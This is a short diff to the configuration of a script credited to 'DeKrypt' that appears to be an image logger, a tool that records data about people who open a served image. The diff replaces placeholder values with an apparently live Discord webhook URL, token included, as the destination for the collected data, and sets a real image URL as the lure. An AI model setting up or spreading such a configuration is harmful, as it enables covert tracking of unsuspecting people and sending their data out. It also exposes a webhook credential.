@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1346595878860750958/dkGbjDMFYLJltC_kfj7pHIhylBCjGU6SuynxagACKCsslJnF3gB7sQRJlfz8zz7knRl3",
+    "image": "https://www.radware.com/RadwareSite/MediaLibraries/Images/Security/Documents/Threat_Advisories_Attack_Reports/PDF/reaper_alert_promo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
